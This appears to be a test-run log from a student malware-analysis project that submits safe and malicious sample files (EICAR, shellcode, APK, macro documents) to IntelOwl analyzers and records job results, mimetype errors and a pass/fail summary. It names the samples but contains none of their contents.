+2025-11-26 09:20:52,310 - INFO - Job 129 completed after 5s
+2025-11-26 09:20:52,810 - INFO - Testing ClamAV on safe/safe_excel.csv
+2025-11-26 09:20:52,850 - INFO - New Job running.. ID: 130 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:20:52,850 - INFO - Analysis submitted to IntelOwl: Job ID 130 for analyzers ['ClamAV']
+2025-11-26 09:20:57,906 - INFO - Job 130 completed after 5s
+2025-11-26 09:20:58,407 - INFO - Testing Yara on safe/safe_excel.csv
+2025-11-26 09:20:58,448 - INFO - New Job running.. ID: 131 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:20:58,448 - INFO - Analysis submitted to IntelOwl: Job ID 131 for analyzers ['Yara']
+2025-11-26 09:21:03,509 - INFO - Job 131 completed after 5s
+2025-11-26 09:21:04,010 - INFO - Testing Xlm_Macro_Deobfuscator on safe/safe_excel.csv
+2025-11-26 09:21:04,018 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nXlm_Macro_Deobfuscator won't be run because does not support the file mimetype."]}
+2025-11-26 09:21:04,018 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nXlm_Macro_Deobfuscator won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:21:04,018 - ERROR - Failed Xlm_Macro_Deobfuscator on safe_excel.csv: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nXlm_Macro_Deobfuscator won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:21:04,518 - INFO - Testing File_Info on safe/safe.pdf
+2025-11-26 09:21:04,558 - INFO - New Job running.. ID: 132 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:04,558 - INFO - Analysis submitted to IntelOwl: Job ID 132 for analyzers ['File_Info']
+2025-11-26 09:21:09,617 - INFO - Job 132 completed after 5s
+2025-11-26 09:21:10,118 - INFO - Testing ClamAV on safe/safe.pdf
+2025-11-26 09:21:10,154 - INFO - New Job running.. ID: 133 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:10,154 - INFO - Analysis submitted to IntelOwl: Job ID 133 for analyzers ['ClamAV']
+2025-11-26 09:21:15,217 - INFO - Job 133 completed after 5s
+2025-11-26 09:21:15,718 - INFO - Testing Yara on safe/safe.pdf
+2025-11-26 09:21:15,753 - INFO - New Job running.. ID: 134 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:15,753 - INFO - Analysis submitted to IntelOwl: Job ID 134 for analyzers ['Yara']
+2025-11-26 09:21:20,824 - INFO - Job 134 completed after 5s
+2025-11-26 09:21:21,325 - INFO - Testing PDF_Info on safe/safe.pdf
+2025-11-26 09:21:21,334 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nPDF_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:21:21,334 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPDF_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:21:21,334 - ERROR - Failed PDF_Info on safe.pdf: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPDF_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:21:21,834 - INFO - Testing MALICIOUS samples...
+2025-11-26 09:21:21,835 - INFO - Testing 18 analyzers on 11 malicious files
+2025-11-26 09:21:21,835 - INFO - Testing File_Info on malicious/malicious.rtf
+2025-11-26 09:21:21,876 - INFO - New Job running.. ID: 135 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:21,876 - INFO - Analysis submitted to IntelOwl: Job ID 135 for analyzers ['File_Info']
+2025-11-26 09:21:26,932 - INFO - Job 135 completed after 5s
+2025-11-26 09:21:27,432 - INFO - Testing ClamAV on malicious/malicious.rtf
+2025-11-26 09:21:27,476 - INFO - New Job running.. ID: 136 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:27,476 - INFO - Analysis submitted to IntelOwl: Job ID 136 for analyzers ['ClamAV']
+2025-11-26 09:21:32,547 - INFO - Job 136 completed after 5s
+2025-11-26 09:21:33,047 - INFO - Testing Yara on malicious/malicious.rtf
+2025-11-26 09:21:33,081 - INFO - New Job running.. ID: 137 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:33,081 - INFO - Analysis submitted to IntelOwl: Job ID 137 for analyzers ['Yara']
+2025-11-26 09:21:38,146 - INFO - Job 137 completed after 5s
+2025-11-26 09:21:38,646 - INFO - Testing Rtf_Info on malicious/malicious.rtf
+2025-11-26 09:21:38,681 - INFO - New Job running.. ID: 138 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:38,681 - INFO - Analysis submitted to IntelOwl: Job ID 138 for analyzers ['Rtf_Info']
+2025-11-26 09:21:43,744 - INFO - Job 138 completed after 5s
+2025-11-26 09:21:44,245 - INFO - Testing File_Info on malicious/eicar_test.exe
+2025-11-26 09:21:44,292 - INFO - New Job running.. ID: 139 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:44,292 - INFO - Analysis submitted to IntelOwl: Job ID 139 for analyzers ['File_Info']
+2025-11-26 09:21:49,352 - INFO - Job 139 completed after 5s
+2025-11-26 09:21:49,852 - INFO - Testing ClamAV on malicious/eicar_test.exe
+2025-11-26 09:21:49,886 - INFO - New Job running.. ID: 140 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:49,886 - INFO - Analysis submitted to IntelOwl: Job ID 140 for analyzers ['ClamAV']
+2025-11-26 09:21:54,945 - INFO - Job 140 completed after 5s
+2025-11-26 09:21:55,445 - INFO - Testing PE_Info on malicious/eicar_test.exe
+2025-11-26 09:21:55,454 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:21:55,454 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:21:55,454 - ERROR - Failed PE_Info on eicar_test.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:21:55,955 - INFO - Testing Capa_Info on malicious/eicar_test.exe
+2025-11-26 09:21:55,964 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:21:55,965 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:21:55,965 - ERROR - Failed Capa_Info on eicar_test.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:21:56,465 - INFO - Testing Flare_Capa on malicious/eicar_test.exe
+2025-11-26 09:21:56,473 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}
+2025-11-26 09:21:56,473 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}}. Details: None
+2025-11-26 09:21:56,473 - ERROR - Failed Flare_Capa on eicar_test.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}}. Details: None
+2025-11-26 09:21:56,974 - INFO - Testing Yara on malicious/eicar_test.exe
+2025-11-26 09:21:57,014 - INFO - New Job running.. ID: 141 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:21:57,014 - INFO - Analysis submitted to IntelOwl: Job ID 141 for analyzers ['Yara']
+2025-11-26 09:22:02,089 - INFO - Job 141 completed after 5s
+2025-11-26 09:22:02,590 - INFO - Testing Signature_Info on malicious/eicar_test.exe
+2025-11-26 09:22:02,601 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:22:02,601 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:02,601 - ERROR - Failed Signature_Info on eicar_test.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:03,101 - INFO - Testing File_Info on malicious/test_malware.exe
+2025-11-26 09:22:03,148 - INFO - New Job running.. ID: 139 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:03,148 - INFO - Analysis submitted to IntelOwl: Job ID 139 for analyzers ['File_Info']
+2025-11-26 09:22:03,173 - INFO - Job 139 completed after 0s
+2025-11-26 09:22:03,674 - INFO - Testing ClamAV on malicious/test_malware.exe
+2025-11-26 09:22:03,694 - INFO - New Job running.. ID: 140 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:03,694 - INFO - Analysis submitted to IntelOwl: Job ID 140 for analyzers ['ClamAV']
+2025-11-26 09:22:03,723 - INFO - Job 140 completed after 0s
+2025-11-26 09:22:04,224 - INFO - Testing PE_Info on malicious/test_malware.exe
+2025-11-26 09:22:04,232 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:22:04,232 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:04,232 - ERROR - Failed PE_Info on test_malware.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:04,733 - INFO - Testing Capa_Info on malicious/test_malware.exe
+2025-11-26 09:22:04,747 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:22:04,747 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:04,747 - ERROR - Failed Capa_Info on test_malware.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:05,248 - INFO - Testing Flare_Capa on malicious/test_malware.exe
+2025-11-26 09:22:05,253 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}
+2025-11-26 09:22:05,253 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}}. Details: None
+2025-11-26 09:22:05,253 - ERROR - Failed Flare_Capa on test_malware.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}}. Details: None
+2025-11-26 09:22:05,753 - INFO - Testing Yara on malicious/test_malware.exe
+2025-11-26 09:22:05,769 - INFO - New Job running.. ID: 141 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:05,769 - INFO - Analysis submitted to IntelOwl: Job ID 141 for analyzers ['Yara']
+2025-11-26 09:22:05,803 - INFO - Job 141 completed after 0s
+2025-11-26 09:22:06,303 - INFO - Testing Signature_Info on malicious/test_malware.exe
+2025-11-26 09:22:06,309 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:22:06,309 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:06,309 - ERROR - Failed Signature_Info on test_malware.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:06,810 - INFO - Testing File_Info on malicious/malicious.pdf
+2025-11-26 09:22:06,851 - INFO - New Job running.. ID: 139 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:06,851 - INFO - Analysis submitted to IntelOwl: Job ID 139 for analyzers ['File_Info']
+2025-11-26 09:22:06,875 - INFO - Job 139 completed after 0s
+2025-11-26 09:22:07,375 - INFO - Testing ClamAV on malicious/malicious.pdf
+2025-11-26 09:22:07,396 - INFO - New Job running.. ID: 140 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:07,396 - INFO - Analysis submitted to IntelOwl: Job ID 140 for analyzers ['ClamAV']
+2025-11-26 09:22:07,423 - INFO - Job 140 completed after 0s
+2025-11-26 09:22:07,924 - INFO - Testing Yara on malicious/malicious.pdf
+2025-11-26 09:22:08,255 - INFO - New Job running.. ID: 141 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:08,255 - INFO - Analysis submitted to IntelOwl: Job ID 141 for analyzers ['Yara']
+2025-11-26 09:22:08,287 - INFO - Job 141 completed after 0s
+2025-11-26 09:22:08,788 - INFO - Testing PDF_Info on malicious/malicious.pdf
+2025-11-26 09:22:08,805 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nPDF_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:22:08,805 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPDF_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:08,805 - ERROR - Failed PDF_Info on malicious.pdf: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPDF_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:09,305 - INFO - Testing File_Info on malicious/calc_shellcode.bin
+2025-11-26 09:22:09,719 - INFO - New Job running.. ID: 142 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:09,719 - INFO - Analysis submitted to IntelOwl: Job ID 142 for analyzers ['File_Info']
+2025-11-26 09:22:14,780 - INFO - Job 142 completed after 5s
+2025-11-26 09:22:15,280 - INFO - Testing ClamAV on malicious/calc_shellcode.bin
+2025-11-26 09:22:15,321 - INFO - New Job running.. ID: 143 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:15,321 - INFO - Analysis submitted to IntelOwl: Job ID 143 for analyzers ['ClamAV']
+2025-11-26 09:22:20,382 - INFO - Job 143 completed after 5s
+2025-11-26 09:22:20,883 - INFO - Testing Capa_Info_Shellcode on malicious/calc_shellcode.bin
+2025-11-26 09:22:20,889 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info_Shellcode won't be run because does not support the file mimetype."]}
+2025-11-26 09:22:20,889 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info_Shellcode won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:20,889 - ERROR - Failed Capa_Info_Shellcode on calc_shellcode.bin: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info_Shellcode won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:22:21,390 - INFO - Testing Yara on malicious/calc_shellcode.bin
+2025-11-26 09:22:21,429 - INFO - New Job running.. ID: 144 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:21,429 - INFO - Analysis submitted to IntelOwl: Job ID 144 for analyzers ['Yara']
+2025-11-26 09:22:26,490 - INFO - Job 144 completed after 5s
+2025-11-26 09:22:26,991 - INFO - Testing File_Info on malicious/malware.apk
+2025-11-26 09:22:27,034 - INFO - New Job running.. ID: 145 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:27,034 - INFO - Analysis submitted to IntelOwl: Job ID 145 for analyzers ['File_Info']
+2025-11-26 09:22:32,087 - INFO - Job 145 completed after 5s
+2025-11-26 09:22:32,587 - INFO - Testing ClamAV on malicious/malware.apk
+2025-11-26 09:22:32,626 - INFO - New Job running.. ID: 146 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:32,626 - INFO - Analysis submitted to IntelOwl: Job ID 146 for analyzers ['ClamAV']
+2025-11-26 09:22:37,708 - INFO - Job 146 completed after 5s
+2025-11-26 09:22:38,209 - INFO - Testing Yara on malicious/malware.apk
+2025-11-26 09:22:38,246 - INFO - New Job running.. ID: 147 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:38,246 - INFO - Analysis submitted to IntelOwl: Job ID 147 for analyzers ['Yara']
+2025-11-26 09:22:43,316 - INFO - Job 147 completed after 5s
+2025-11-26 09:22:43,817 - INFO - Testing Androguard on malicious/malware.apk
+2025-11-26 09:22:43,855 - INFO - New Job running.. ID: 148 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:43,855 - INFO - Analysis submitted to IntelOwl: Job ID 148 for analyzers ['Androguard']
+2025-11-26 09:22:48,920 - INFO - Job 148 completed after 5s
+2025-11-26 09:22:49,421 - INFO - Testing APKiD on malicious/malware.apk
+2025-11-26 09:22:49,465 - INFO - New Job running.. ID: 149 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:49,465 - INFO - Analysis submitted to IntelOwl: Job ID 149 for analyzers ['APKiD']
+2025-11-26 09:22:54,527 - INFO - Job 149 completed after 5s
+2025-11-26 09:22:55,027 - INFO - Testing APK_Artifacts on malicious/malware.apk
+2025-11-26 09:22:55,060 - INFO - New Job running.. ID: 150 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:22:55,060 - INFO - Analysis submitted to IntelOwl: Job ID 150 for analyzers ['APK_Artifacts']
+2025-11-26 09:23:00,115 - INFO - Job 150 completed after 5s
+2025-11-26 09:23:00,616 - INFO - Testing Quark_Engine on malicious/malware.apk
+2025-11-26 09:23:00,690 - INFO - New Job running.. ID: 151 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:23:00,690 - INFO - Analysis submitted to IntelOwl: Job ID 151 for analyzers ['Quark_Engine']
+2025-11-26 09:23:05,749 - INFO - Job 151 completed after 5s
+2025-11-26 09:23:06,249 - INFO - Testing File_Info on malicious/xlm_malware.csv
+2025-11-26 09:23:06,442 - INFO - New Job running.. ID: 152 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:23:06,442 - INFO - Analysis submitted to IntelOwl: Job ID 152 for analyzers ['File_Info']
+2025-11-26 09:23:11,505 - INFO - Job 152 completed after 5s
+2025-11-26 09:23:12,006 - INFO - Testing ClamAV on malicious/xlm_malware.csv
+2025-11-26 09:23:12,043 - INFO - New Job running.. ID: 153 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:23:12,043 - INFO - Analysis submitted to IntelOwl: Job ID 153 for analyzers ['ClamAV']
+2025-11-26 09:23:17,111 - INFO - Job 153 completed after 5s
+2025-11-26 09:23:17,611 - INFO - Testing Yara on malicious/xlm_malware.csv
+2025-11-26 09:23:17,647 - INFO - New Job running.. ID: 154 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:23:17,647 - INFO - Analysis submitted to IntelOwl: Job ID 154 for analyzers ['Yara']
+2025-11-26 09:23:22,708 - INFO - Job 154 completed after 5s
+2025-11-26 09:23:23,209 - INFO - Testing Xlm_Macro_Deobfuscator on malicious/xlm_malware.csv
+2025-11-26 09:23:23,215 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nXlm_Macro_Deobfuscator won't be run because does not support the file mimetype."]}
+2025-11-26 09:23:23,216 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nXlm_Macro_Deobfuscator won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:23:23,216 - ERROR - Failed Xlm_Macro_Deobfuscator on xlm_malware.csv: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nXlm_Macro_Deobfuscator won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:23:23,716 - INFO - Testing File_Info on malicious/strings_malicious.txt
+2025-11-26 09:23:23,755 - INFO - New Job running.. ID: 155 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:23:23,755 - INFO - Analysis submitted to IntelOwl: Job ID 155 for analyzers ['File_Info']
+2025-11-26 09:23:28,809 - INFO - Job 155 completed after 5s
+2025-11-26 09:23:29,310 - INFO - Testing ClamAV on malicious/strings_malicious.txt
+2025-11-26 09:23:29,352 - INFO - New Job running.. ID: 156 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:23:29,352 - INFO - Analysis submitted to IntelOwl: Job ID 156 for analyzers ['ClamAV']
+2025-11-26 09:23:34,414 - INFO - Job 156 completed after 5s
+2025-11-26 09:23:34,914 - INFO - Testing Yara on malicious/strings_malicious.txt
+2025-11-26 09:23:34,951 - INFO - New Job running.. ID: 157 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:23:34,951 - INFO - Analysis submitted to IntelOwl: Job ID 157 for analyzers ['Yara']
+2025-11-26 09:23:40,014 - INFO - Job 157 completed after 5s
+2025-11-26 09:23:40,514 - INFO - Testing Strings_Info on malicious/strings_malicious.txt
+2025-11-26 09:23:40,550 - INFO - New Job running.. ID: 158 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:23:40,550 - INFO - Analysis submitted to IntelOwl: Job ID 158 for analyzers ['Strings_Info']
+2025-11-26 09:23:55,680 - INFO - Job 158 completed after 15s
+2025-11-26 09:23:56,180 - INFO - Testing File_Info on malicious/malicious.js
+2025-11-26 09:23:56,255 - INFO - New Job running.. ID: 159 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:23:56,255 - INFO - Analysis submitted to IntelOwl: Job ID 159 for analyzers ['File_Info']
+2025-11-26 09:24:01,318 - INFO - Job 159 completed after 5s
+2025-11-26 09:24:01,819 - INFO - Testing ClamAV on malicious/malicious.js
+2025-11-26 09:24:01,865 - INFO - New Job running.. ID: 160 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:01,865 - INFO - Analysis submitted to IntelOwl: Job ID 160 for analyzers ['ClamAV']
+2025-11-26 09:24:06,928 - INFO - Job 160 completed after 5s
+2025-11-26 09:24:07,429 - INFO - Testing Yara on malicious/malicious.js
+2025-11-26 09:24:07,469 - INFO - New Job running.. ID: 161 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:07,469 - INFO - Analysis submitted to IntelOwl: Job ID 161 for analyzers ['Yara']
+2025-11-26 09:24:12,545 - INFO - Job 161 completed after 5s
+2025-11-26 09:24:13,045 - INFO - Testing Strings_Info on malicious/malicious.js
+2025-11-26 09:24:13,081 - INFO - New Job running.. ID: 162 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:13,081 - INFO - Analysis submitted to IntelOwl: Job ID 162 for analyzers ['Strings_Info']
+2025-11-26 09:24:28,216 - INFO - Job 162 completed after 15s
+2025-11-26 09:24:28,717 - INFO - Testing BoxJS on malicious/malicious.js
+2025-11-26 09:24:28,748 - INFO - New Job running.. ID: 163 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:28,748 - INFO - Analysis submitted to IntelOwl: Job ID 163 for analyzers ['BoxJS']
+2025-11-26 09:24:43,879 - INFO - Job 163 completed after 15s
+2025-11-26 09:24:44,380 - INFO - Testing File_Info on malicious/eicar.com
+2025-11-26 09:24:44,400 - INFO - New Job running.. ID: 139 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:44,400 - INFO - Analysis submitted to IntelOwl: Job ID 139 for analyzers ['File_Info']
+2025-11-26 09:24:44,433 - INFO - Job 139 completed after 0s
+2025-11-26 09:24:44,934 - INFO - Testing ClamAV on malicious/eicar.com
+2025-11-26 09:24:44,951 - INFO - New Job running.. ID: 140 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:44,951 - INFO - Analysis submitted to IntelOwl: Job ID 140 for analyzers ['ClamAV']
+2025-11-26 09:24:44,983 - INFO - Job 140 completed after 0s
+2025-11-26 09:24:45,483 - INFO - Testing Yara on malicious/eicar.com
+2025-11-26 09:24:45,502 - INFO - New Job running.. ID: 141 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:45,502 - INFO - Analysis submitted to IntelOwl: Job ID 141 for analyzers ['Yara']
+2025-11-26 09:24:45,538 - INFO - Job 141 completed after 0s
+2025-11-26 09:24:46,038 - INFO - Testing File_Info on malicious/macro_doc.doc
+2025-11-26 09:24:46,077 - INFO - New Job running.. ID: 164 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:46,078 - INFO - Analysis submitted to IntelOwl: Job ID 164 for analyzers ['File_Info']
+2025-11-26 09:24:51,136 - INFO - Job 164 completed after 5s
+2025-11-26 09:24:51,637 - INFO - Testing ClamAV on malicious/macro_doc.doc
+2025-11-26 09:24:51,678 - INFO - New Job running.. ID: 165 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:51,679 - INFO - Analysis submitted to IntelOwl: Job ID 165 for analyzers ['ClamAV']
+2025-11-26 09:24:56,739 - INFO - Job 165 completed after 5s
+2025-11-26 09:24:57,240 - INFO - Testing Yara on malicious/macro_doc.doc
+2025-11-26 09:24:57,275 - INFO - New Job running.. ID: 166 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:24:57,275 - INFO - Analysis submitted to IntelOwl: Job ID 166 for analyzers ['Yara']
+2025-11-26 09:25:02,337 - INFO - Job 166 completed after 5s
+2025-11-26 09:25:02,838 - INFO - Testing Doc_Info on malicious/macro_doc.doc
+2025-11-26 09:25:02,873 - INFO - New Job running.. ID: 167 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:25:02,873 - INFO - Analysis submitted to IntelOwl: Job ID 167 for analyzers ['Doc_Info']
+2025-11-26 09:25:07,927 - INFO - Job 167 completed after 5s
+2025-11-26 09:25:08,437 - INFO - Results saved to /home/anonymous/COLLEGE/ThreatFlow/testing_responses/responses/comprehensive_test_results.json
+2025-11-26 09:25:08,443 - INFO - Analysis saved to /home/anonymous/COLLEGE/ThreatFlow/testing_responses/responses/test_analysis.json
+
+==================================================
+COMPREHENSIVE ANALYZER TESTING COMPLETE
+==================================================
+Total tests run: 107
+Successful: 85
+Failed: 22
+
+Analyzer Coverage:
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+.1f
+
+Errors encountered (22):
+  PE_Info on clean.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
